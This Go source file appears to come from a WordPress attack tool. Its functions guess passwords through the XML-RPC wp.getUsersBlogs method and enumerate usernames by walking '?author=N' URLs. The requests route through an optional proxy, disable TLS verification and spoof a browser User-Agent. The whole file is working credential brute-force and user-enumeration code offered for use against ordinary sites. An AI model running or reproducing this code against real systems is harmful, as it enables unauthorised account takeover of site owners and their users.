package wpuf

import (
	"crypto/tls"
	"errors"
	"fmt"
	"golang.org/x/exp/slices"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

// Check password by making request to endpoint
func CheckPasswordRequest(settings *Settings, password string, counterError *uint64) (bool, bool) {
	//fmt.Println(link)
	data := "<?xml version=1.0 encoding=iso-8859-1?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" + settings.Username + "</value></param><param><value>" + password + "</value></param></params></methodCall>"
	var tr *http.Transport
	if len(settings.Proxy) > 0 {
		proxyURL, err := url.Parse(settings.Proxy)
		CheckError(err)
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           http.ProxyURL(proxyURL),
		}

	} else {
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}
	// 10 seconds timeout
	client := http.Client{
		Timeout:   time.Duration(settings.Timeout) * time.Second,
		Transport: tr,
	}
	req, _ := http.NewRequest("POST", settings.Url, strings.NewReader(data))
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0")
	req.Header.Set("Content-Type", "application/xml")
	resp, err := client.Do(req)
	// if error, return false
	if err != nil {
		atomic.AddUint64(counterError, 1)
		fmt.Println(fmt.Errorf("[ERROR] %s - %s", settings.Url, err))
		// error, password not found
		return true, false
	}
	// wpuf.CheckError for resp status code
	if resp.StatusCode != 200 {
		ex := "Status code is " + strconv.FormatInt(int64(resp.StatusCode), 10) + " - " + settings.Url
		CheckError(errors.New(ex))
	}
	// success is when response length is over 700
	// might be faster, but could return false positives
	//if resp.ContentLength > 700 {
	//	return true
	//}
	//return false
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		CheckError(err)
	}(resp.Body)

	bodyBytes, err := io.ReadAll(resp.Body)
	// wpuf.CheckError for error
	if err != nil {
		atomic.AddUint64(counterError, 1)
		fmt.Println(fmt.Errorf("[ERROR] %s - %s", settings.Url, err))
		// error, password not found
		return true, false
	}
	bodyString := string(bodyBytes)
	if strings.Contains(bodyString, "<member><name>") {
		// password found !
		return false, true
	}
	// no error, password not found
	return false, false
}

// tries to get the author name using an id
func getAuthorById(id int, settings *Settings) string {
	authorUrl := settings.Url + fmt.Sprintf("?author=%d", id)
	var tr *http.Transport
	if len(settings.Proxy) > 0 {
		proxyURL, err := url.Parse(settings.Proxy)
		CheckError(err)
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           http.ProxyURL(proxyURL),
		}

	} else {
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}
	// 10 seconds timeout
	client := http.Client{
		Timeout:   time.Duration(settings.Timeout) * time.Second,
		Transport: tr,
	}
	req, _ := http.NewRequest("GET", authorUrl, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0")
	resp, err := client.Do(req)
	// if error, return false
	if err != nil {
		return ""
	}
	// wpuf.CheckError for resp status code
	if resp.StatusCode != 200 {
		return ""
	}
	// success is when response length is over 700
	// might be faster, but could return false positives
	//if resp.ContentLength > 700 {
	//	return true
	//}
	//return false
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		CheckError(err)
	}(resp.Body)

	bodyBytes, err := io.ReadAll(resp.Body)
	// wpuf.CheckError for error
	if err != nil {
		fmt.Printf("[WARNING] Cannot parse user response body: %s\n", err)
		return ""
	}
	bodyString := string(bodyBytes)

	return parseAuthorResponse(bodyString)
}

// Try to enumerate users
func FindUsers(settings *Settings) []string {
	var users []string
	for i := 0; i <= MaxAuthorId; i++ {
		author := getAuthorById(i, settings)
		// if author already in, continue
		if slices.Contains(users, author) {
			continue
		}
		if len(author) > 0 {
			fmt.Printf(InfoColor, fmt.Sprintf("[+] Found user: %s\n", author))
			users = append(users, author)
		}
	}
	return users
}
